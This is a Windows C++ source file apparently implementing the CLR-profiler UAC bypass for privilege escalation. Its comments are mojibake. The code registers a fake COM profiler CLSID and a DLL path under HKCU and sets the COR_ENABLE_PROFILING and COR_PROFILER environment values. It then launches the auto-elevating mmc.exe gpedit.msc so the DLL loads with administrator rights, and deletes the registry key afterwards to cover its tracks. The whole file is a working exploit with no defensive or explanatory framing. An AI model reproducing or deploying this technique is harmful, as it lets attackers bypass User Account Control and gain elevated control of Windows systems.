// CLR��Ȩ.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include <windows.h>

int main(int argc,char* argv[])
{
	HKEY hKeyExe = NULL;
	HKEY hEnv = NULL;
	HKEY hCLSID = NULL;
	// 1�� ע����Ȩexe��ַ,dll�ļ���ȡ�õ�ִַ��
	if (argc < 2)
	{
		printf("��ָ����Ȩexe�ļ�·����\n");
		return 0;
	}
	// 1.1 ����Ҫ��Ȩ���ļ�·��ע�ᵽHKCU\Software\MyExe��
	int nLen = strlen(argv[1]);
	TCHAR szExePath[MAX_PATH] = {};
	MultiByteToWideChar(CP_ACP, NULL, argv[1], nLen, szExePath, MAX_PATH);
	TCHAR szKeyName[MAX_PATH]={ L"Software\\MyExe" };
	long lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
		szKeyName, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS| KEY_WOW64_32KEY, NULL, &hKeyExe, NULL);
	if (lResult != ERROR_SUCCESS)
		return 0;
	RegSetValueEx(hKeyExe, NULL, 0, REG_SZ, (BYTE*)szExePath,nLen*2);
	RegCloseKey(hKeyExe);
	// 2�� ��ӻ�������
	lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
		L"Environment", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hEnv, NULL);
	if (lResult != ERROR_SUCCESS)
		return 0;
	RegSetValueEx(hEnv, L"COR_ENABLE_PROFILING", 0, REG_SZ, (BYTE*)L"1", 2);
	TCHAR wcCLSID[] = L"{11111111-1111-1111-1111-111111111111}";
	RegSetValueEx(hEnv, L"COR_PROFILER", 0, REG_SZ, (BYTE*)wcCLSID, wcslen(wcCLSID)*2);
	RegCloseKey(hEnv);
	// 3�� ע��CLSID,ָ��dll·��
	TCHAR szCLSID[MAX_PATH] = {L"Software\\Classes\\CLSID\\{11111111-1111-1111-1111-111111111111}\\InprocServer32"};
	// ��ʾ�ã�DLL·���̶�
	TCHAR szDll[MAX_PATH] = {L"C:\\Temp\\test.dll"};
	RegCreateKeyEx(HKEY_CURRENT_USER,
		szCLSID, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hCLSID, NULL);
	RegSetValueEx(hCLSID, NULL, 0, REG_SZ, (BYTE*)szDll, (wcslen(szDll)+1)*2);
	RegCloseKey(hCLSID);
	// 4������msc���򣬼���DLL
	system("mmc.exe gpedit.msc");
	// 5��ɾ��ע���CLSID������ֹӰ��������������
	RegDeleteKeyEx(HKEY_CURRENT_USER, szCLSID, KEY_WOW64_32KEY, NULL);
    return 0;
}

